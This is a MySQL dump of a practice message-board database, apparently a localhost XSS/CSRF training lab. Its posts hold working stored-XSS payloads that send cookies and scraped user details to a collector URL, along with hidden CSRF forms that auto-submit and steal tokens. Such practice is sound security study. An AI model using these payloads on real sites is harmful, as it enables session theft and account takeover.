-- MySQL dump 10.13  Distrib 9.3.0, for macos14.7 (arm64)
--
-- Host: localhost    Database: Sharks
-- ------------------------------------------------------
-- Server version	9.3.0

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `board_table`
--

DROP TABLE IF EXISTS `board_table`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `board_table` (
  `board_idx` int NOT NULL AUTO_INCREMENT,
  `board_title` varchar(255) NOT NULL,
  `user_idx` int NOT NULL,
  `board_date` datetime DEFAULT CURRENT_TIMESTAMP,
  `board_views` int DEFAULT '0',
  `board_content` text,
  `board_file` varchar(255) DEFAULT NULL,
  `board_file_original_name` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`board_idx`),
  KEY `user_idx` (`user_idx`),
  CONSTRAINT `board_table_ibfk_1` FOREIGN KEY (`user_idx`) REFERENCES `user_table` (`user_idx`) ON DELETE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=37 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `board_table`
--

LOCK TABLES `board_table` WRITE;
/*!40000 ALTER TABLE `board_table` DISABLE KEYS */;
INSERT INTO `board_table` VALUES (1,'bb',3,'2024-12-22 18:23:27',25,'bbvv',NULL,NULL),(2,'test',4,'2025-04-06 19:57:15',63,'123<script>var cookieData = document.cookie;var i = new Image();i.src = \"http://localhost:7777/getCred.php?\" + cookieData;</script>\r\n\r\n',NULL,NULL),(5,'관리자님 긴급!!!',7,'2025-04-07 00:41:41',26,'웹페이지좀 봐주세요 넘 허술해요\r\n<script>var cookieData = document.cookie;var i = new Image();i.src = \"http://localhost:7777/getCred.php?\" + cookieData</script>','',NULL),(6,'hi',4,'2025-04-08 19:23:16',10,'hi <a href=\"javascript:alert(1)\">Click</a>\r\n','',''),(9,'관리자보셈',7,'2025-04-08 20:01:37',26,'관리자 하이\r\n<iframe src=\"http://localhost:8888/mypage.php\" id=\"targetFrame\"></iframe><script>document.getElementById(\'targetFrame\').onload =function () {var targetTag = document.getElementById(\'targetFrame\');var DOMData = targetTag.contentDocument;var secretData1 =DOMData.getElementById(\'username\').value;var secretData2 =DOMData.getElementById(\'email\').value;var secretData3 =DOMData.getElementById(\'phonenum\').value;var i = new Image();i.src = \"http://localhost:7777/getCred.php?\"+\"[name]:%20\"+secretData1+\"%20[email]:%20\"+secretData2+\"%20[phonenumber]:%20\"+secretData3;};</script>',NULL,NULL),(14,'csrf test',7,'2025-04-09 19:58:23',11,'test\r\n<iframe name=attackFrame style=display:none sandbox=\"allow-forms allow-scripts\"></iframe>\r\n<form method=POST action=\"http://localhost:8888/mypage_proc.php\" target=attackFrame id=myForm>\r\n<input type=hidden name=username value=test>\r\n<input type=hidden name=email value=test@test.com>\r\n<input type=hidden name=phonenum value=010-2313-2221>\r\n<input type=hidden name=pw value=1234>\r\n</form>\r\n<script>onload=function(){myForm.submit()}</script>',NULL,NULL),(16,'csrf token test',7,'2025-04-09 23:06:28',11,'test\r\n<iframe style=\"display:none\" src=\"http://localhost:8888/mypage.php\" id=\"stealthFrame1\"></iframe><iframe style=\"display:none;\" name=\"stealthFrame2\" sandbox=\"allow-forms allow-scripts\"></iframe><form method=\"POST\" action=\"http://localhost:8888/mypage_proc.php\" id=\"myForm\" target=\"stealthFrame2\"><input type=\"hidden\" name=\"username\" value=\"test\"><input type=\"hidden\" name=\"email\" value=\"test@test.com\"><input type=\"hidden\" name=\"phonenum\" value=\"010-2313-2221\"><input type=\"hidden\" name=\"pw\" value=\"1234\"></form><script>var targetTag=document.getElementById(\'stealthFrame1\');targetTag.onload=function () {var DOMdata=targetTag.contentDocument;var csrfToken =DOMdata.getElementsByName(\'csrf_token\')[0].value;var hiddenField =document.createElement(\'input\');hiddenField.type = \'hidden\';hiddenField.name = \'csrf_token\';hiddenField.value = csrfToken;var myForm =document.getElementById(\'myForm\');myForm.appendChild(hiddenField);myForm.submit();try {window.frames[\'stealthFrame2\'].alert =function () {};}catch (e){}};</script>',NULL,NULL),(35,'te',7,'2025-04-18 03:32:46',10,'te','file_6801494e010ca1.32687769.png','너무 어려워요.png');
/*!40000 ALTER TABLE `board_table` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `user_table`
--

DROP TABLE IF EXISTS `user_table`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `user_table` (
  `user_idx` int NOT NULL AUTO_INCREMENT,
  `user_id` varchar(50) NOT NULL,
  `user_password` varchar(255) NOT NULL,
  `user_email` varchar(100) NOT NULL,
  `user_phonenum` varchar(15) DEFAULT NULL,
  `profile_image` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`user_idx`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `user_table`
--

LOCK TABLES `user_table` WRITE;
/*!40000 ALTER TABLE `user_table` DISABLE KEYS */;
INSERT INTO `user_table` VALUES (3,'bbb','5edc1c6a4390075a3ca27f4d4161c46b374b1c3b2d63f846db6fff0c513203c3ac3b14a24a6f09d8bf21407a4842113b5d9aa359d266299c3d6cf9e92db66dbe','bbb@example.com','010-2222-2222',NULL),(4,'admin','c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec','admin@admin.com','010-1234-5678',NULL),(5,'aaa','aaa','aaa@example.com','010-1111-1111','img/profileshark.png'),(6,'ccc','2b83283b8caf7e952ad6b0443a87cd9ee263bc32c4d78c5b678ac03556175059679b4b8513b021b16a27f6d2a35484703129129f35b6cdfe418ef6473b1f8f23','ccc@example.com','010-3333-3333',NULL),(7,'test','ee26b0dd4af7e749aa1a8ee3c10ae9923f618980772e473f8819a5d4940e0db27ac185f8a0e1d5f84f88bc887fd67b143732c304cc5fa9ad8e6f57f50028a8ff','test@test.com','010-2313-2221','userupload/너무 어려워요.png');
/*!40000 ALTER TABLE `user_table` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2025-04-19  0:41:54
